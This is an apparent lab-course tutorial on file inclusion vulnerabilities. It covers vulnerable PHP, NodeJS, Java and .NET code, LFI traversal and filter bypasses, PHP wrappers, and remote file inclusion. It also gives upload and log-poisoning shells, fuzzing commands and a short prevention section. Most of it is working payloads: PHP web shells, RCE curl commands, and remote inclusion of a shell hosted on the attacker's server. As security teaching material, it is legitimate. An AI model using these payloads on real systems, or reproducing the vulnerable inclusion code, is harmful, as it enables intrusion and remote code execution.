## Intro to File Inclusions

HTTP parameters often select resources shown on a page. Unsafe handling lets an attacker manipulate those parameters to include local files, leading to Local File Inclusion. LFI can disclose source code, leak credentials and keys, enumerate the server, and sometimes lead to remote code execution.

### Local File Inclusion (LFI)

LFI commonly appears in templating engines. A page such as `/index.php?page=about` may load static header/footer content and then include dynamic content from `about.php`. Controlling the `about` portion can make the application include other files.

### Examples of Vulnerable Code

File inclusion appears in PHP, NodeJS, Java, .NET, and other frameworks. The shared pattern is loading a file from a user-influenced path.

### PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

Other PHP functions can be vulnerable when path input is user-controlled: `include_once()`, `require()`, `require_once()`, `file_get_contents()`, `fopen()`, and `file()`.

### NodeJS

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

Express route parameters can also be vulnerable:

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### Java

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

### .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Read vs Execute

Some inclusion functions only read file content; others execute included files. Some accept remote URLs; others do not.

PHP `include()` and `include_once()` read, execute, and accept remote URLs. PHP `require()` and `require_once()` read and execute but do not accept remote URLs. PHP `file_get_contents()` reads and accepts remote URLs but does not execute. PHP `fopen()` and `file()` only read local content.

NodeJS `fs.readFile()` and `fs.sendFile()` only read local content. NodeJS `res.render()` reads and executes local templates.

Java `include` reads local content without execution. Java `import` reads, executes, and accepts remote URLs.

.NET `@Html.Partial()` reads local content without execution. .NET `@Html.RemotePartial()` reads remote content without execution. .NET `Response.WriteFile()` reads local content without execution. .NET `include` reads, executes, and accepts remote URLs.

Execute-capable functions can lead to RCE. Read-only functions can still expose source code, credentials, and keys.

## Local File Inclusion (LFI)

### Basic LFI

Language selection may produce:

```text
http://<TARGET_IP>:<PORT>/index.php?language=es.php
```

Read a common Linux file:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd
```

On Windows, try:

```text
C:\Windows\boot.ini
```

### Path Traversal

Direct absolute paths work when the parameter is used unchanged:

```php
include($_GET['language']);
```

When a directory is prepended:

```php
include("./languages/" . $_GET['language']);
```

`/etc/passwd` becomes `./languages//etc/passwd` and fails. Traverse upward:

```text
http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

If the web root is `/var/www/html/`, three traversals reach root: `../../../`. Extra `../` sequences at root do not break the path.

### Filename Prefix

When input is appended after a prefix:

```php
include("lang_" . $_GET['language']);
```

`../../../etc/passwd` becomes `lang_../../../etc/passwd`. Prefix a slash:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

This treats `lang_` as a directory. It may fail if `lang_/` does not exist, and prefixes can break wrappers, filters, or RFI.

### Appended Extensions

When an extension is appended:

```php
include($_GET['language'] . ".php");
```

`/etc/passwd` becomes `/etc/passwd.php`. Reading PHP files may still work, but source disclosure may require PHP filters.

### Second-Order Attacks

A poisoned stored value can be used later by another file-loading function. Example: register a username such as `../../../etc/passwd`, then request an avatar path like `/profile/$username/avatar.png`. The application trusts its own database value and includes the attacker-controlled path.

## Basic Bypasses

### Non-Recursive Path Traversal Filters

Single-pass removal of `../`:

```php
$language = str_replace('../', '', $_GET['language']);
```

Bypass with nested traversal:

```text
http://<TARGET_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

Other recursive forms include `..././` and `....\/`. Extra slashes such as `....////` may also work.

### Encoding

URL-encode dots and slashes:

```text
%2e%2e%2f
```

Full encoded traversal:

```text
http://<TARGET_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Encode all characters, including dots. Double encoding may bypass additional filters. Burp Decoder can encode and re-encode.

### Approved Paths

Regex may require an approved prefix:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Start with the approved path, then traverse:

```text
http://<TARGET_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

Combine with encoding or recursive traversal when multiple filters exist.

### Appended Extension

Modern PHP often restricts appended-extension LFI to files with that extension. Source disclosure may still be possible through PHP filters. Older PHP versions may allow truncation or null bytes.

### Path Truncation

Older PHP versions truncated strings around 4096 characters and removed trailing slashes and dots. Multiple slashes and `.` path segments are ignored.

Generate a truncation payload:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

The appended `.php` is truncated after the maximum length. Start with a non-existing directory. Calculate total length so the target file is not truncated.

### Null Bytes

PHP before 5.5 accepted null-byte termination:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd%00
```

The final path becomes `/etc/passwd%00.php`, but everything after `%00` is ignored.

## PHP Filters

### Input Filters

PHP wrappers access I/O streams. Use `php://filter/` to transform stream data. The `resource` parameter selects the stream; the `read` parameter selects the filter. The useful LFI filter is `convert.base64-encode`.

### Fuzzing for PHP Files

Fuzz PHP files:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<TARGET_IP>:<PORT>/FUZZ.php
```

Include non-200 responses such as 301, 302, and 403 because LFI can still read their source. After reading source files, follow references to other PHP files.

### Standard PHP Inclusion

Including a PHP file normally executes it:

```text
http://<TARGET_IP>:<PORT>/index.php?language=config
```

If `config.php` only sets configuration, output may be empty.

### Source Code Disclosure

Read PHP source as base64:

```text
php://filter/read=convert.base64-encode/resource=config
```

Full request:

```text
http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

The appended `.php` makes the resource `config.php`.

Decode:

```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

Copy the entire base64 string from page source.

## PHP Wrappers

### Data

The `data` wrapper includes external data, including PHP code. It requires `allow_url_include = On`.

### Checking PHP Configurations

Apache PHP config:

```text
/etc/php/X.Y/apache2/php.ini
```

FPM PHP config:

```text
/etc/php/X.Y/fpm/php.ini
```

Read and decode the config:

```bash
curl "http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Expected enabling value:

```text
allow_url_include = On
```

This setting is also required for `php://input` and RFI.

### Remote Code Execution

Base64-encode a PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Output:

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

URL-encode the base64 and pass it to the `data` wrapper:

```text
http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

curl:

```bash
curl -s 'http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input

`php://input` reads PHP code from POST body data. It also requires `allow_url_include = On`.

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

If the vulnerable code only accepts POST, hardcode the command:

```php
<?php system('id')?>
```

### Expect

`expect://` executes commands directly. The expect extension must be installed and loaded.

Check config:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

Expected directive:

```text
extension=expect
```

Test execution:

```bash
curl -s "http://<TARGET_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

## Remote File Inclusion (RFI)

RFI includes remote URLs. It enables SSRF and remote code execution when the included remote file executes.

### Local vs. Remote File Inclusion

RFI-capable functions are usually also LFI-capable. LFI is not always RFI because the function may not allow remote URLs, only part of the filename may be controlled, or server configuration may disable remote inclusion. Remote-read functions without execution can still support SSRF.

### Verify RFI

Check PHP configuration:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

More reliable test: include a local URL first:

```text
http://<TARGET_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

If the page renders, URL inclusion works. If PHP executes, remote code execution may be possible. Avoid including the vulnerable page itself in production because recursive inclusion can cause DoS.

### Remote Code Execution with RFI

Create a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Host it on port 80 or 443 when egress filtering may block uncommon ports.

### HTTP

Start a web server:

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

Include the shell:

```text
http://<TARGET_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

If an extra extension is appended, remove `.php` from the payload.

### FTP

Start an FTP server:

```bash
sudo python -m pyftpdlib -p 21
```

Include through FTP:

```text
http://<TARGET_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

PHP attempts anonymous authentication by default. Credentials can be embedded:

```bash
curl 'http://<TARGET_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
```

### SMB

Windows targets can include remote SMB files as UNC paths without `allow_url_include`.

Start an SMB share with Impacket:

```bash
impacket-smbserver -smb2support share $(pwd)
```

Include:

```text
http://<TARGET_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

This works best on the same network because outbound SMB over the internet may be blocked.

## LFI and File Uploads

If the vulnerable inclusion function executes files, uploaded content can be executed regardless of file extension or upload-form security.

### Image upload

### Crafting Malicious Image

Create a GIF with embedded PHP:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

GIF magic bytes are printable ASCII. Other image types work if their magic bytes are correctly supplied.

### Uploaded File Path

Upload the file, then inspect the page source:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Include it:

```text
http://<TARGET_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

If the LFI prefixes a directory, traverse out first, then use the uploaded path.

### Zip Upload

Create a PHP shell and zip it with an image name:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Upload `shell.jpg`, then include through the zip wrapper. `#` is URL-encoded as `%23`:

```text
http://<TARGET_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

The zip wrapper is not enabled by default.

### Phar Upload

Create `shell.php`:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile and rename:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload `shell.jpg`, then include through the phar wrapper. `/` is URL-encoded as `%2F`:

```text
http://<TARGET_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

An obsolete attack exists when LFI, uploads, old PHP, and an exposed `phpinfo()` page all coincide.

## Log Poisoning

Write PHP code into a controllable logged field, then include the log file with an execute-capable inclusion function.

### PHP Session Poisoning

PHP session files are stored in `/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows. The filename is `sess_<PHPSESSID>`.

Include the session file:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
```

If a session value such as `page` comes from the `language` parameter, poison it:

```text
http://<TARGET_IP>:<PORT>/index.php?language=session_poisoning
```

Re-include the session file to confirm control.

URL-encode a PHP web shell into the parameter:

```text
http://<TARGET_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Include the session file and execute:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

The session file may be overwritten after inclusion. Use the execution to write a permanent shell or send a reverse shell.

### Server Log Poisoning

Apache and Nginx logs include the User-Agent header. Apache logs are commonly under `/var/log/apache2/`; Nginx logs under `/var/log/nginx/`. Windows Apache may use `C:\xampp\apache\logs\`; Windows Nginx may use `C:\nginx\log\`. Nginx logs are often readable by low-privileged users; Apache logs usually require higher privileges unless misconfigured.

Read the Apache access log:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

Poison with Burp by changing User-Agent, or with curl:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET_IP>:<PORT>/index.php" -H @Poison
```

Include the log and execute:

```text
http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

Logs can be large and may slow or crash the server when included.

User-Agent may also appear under `/proc/self/environ` or `/proc/self/fd/N`, where N is often between 0 and 50. Other poisonable logs include `/var/log/sshd.log`, `/var/log/mail`, and `/var/log/vsftpd.log`. SSH or FTP usernames, mail content, or other logged controlled fields can contain PHP code.

## Automated Scanning

### Fuzzing Parameters

Fuzz exposed GET parameters:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

Exposed parameters not linked to forms may be less protected.

### LFI wordlists

Use a general LFI wordlist:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

The list contains traversal payloads, encoded traversals, and common files. Verify hits manually.

### Fuzzing Server Files

### Server Webroot

Fuzz common Linux webroot paths:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

A hit such as `/var/www/html/` reveals the webroot. Use Windows webroot wordlists for Windows targets.

### Server Logs/Configurations

Fuzz sensitive Linux files:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Read Apache configuration:

```bash
curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

Relevant values include `DocumentRoot /var/www/html` and log paths using `${APACHE_LOG_DIR}`.

Read Apache environment variables:

```bash
curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

`APACHE_LOG_DIR=/var/log/apache2` resolves the log directory.

### LFI Tools

LFISuite, LFiFreak, and liffy automate LFI testing. Many tools are unmaintained and depend on Python 2. Manual testing remains more reliable.

## File Inclusion Prevention

### File Inclusion Prevention

Do not pass user-controlled input into file inclusion functions or APIs. Load assets internally without user interaction. When user selection is required, map allowed inputs to server-side files through a whitelist, database table, case-match script, or static JSON map. Use a default value for unrecognized input.

### Preventing Directory Traversal

Use framework-native filename extraction. PHP example:

```php
basename($path)
```

This returns only the filename portion, but prevents directory access when the application only needs filenames.

Custom traversal sanitization can miss edge cases. Bash wildcard behavior differs from PHP:

```bash
cat .?/.*/.?/etc/passwd
```

```php
echo file_get_contents('.?/.*/.?/etc/passwd');
```

If PHP calls a shell through `system()`, shell wildcard behavior may bypass custom filters.

Recursive traversal removal:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

### Web Server Configuration

Disable remote file inclusion in PHP by setting `allow_url_fopen` and `allow_url_include` to Off. Confine applications to their web root with Docker or PHP `open_basedir = /var/www`. Disable dangerous modules and wrappers such as PHP expect and `mod_userdir`.

### Web Application Firewall (WAF)

Use a WAF such as ModSecurity. Start in permissive mode to log would-be blocks and tune false positives before blocking. Hardening reduces impact and improves detection, but does not make systems un-hackable. Continue monitoring logs and retest after relevant zero-days.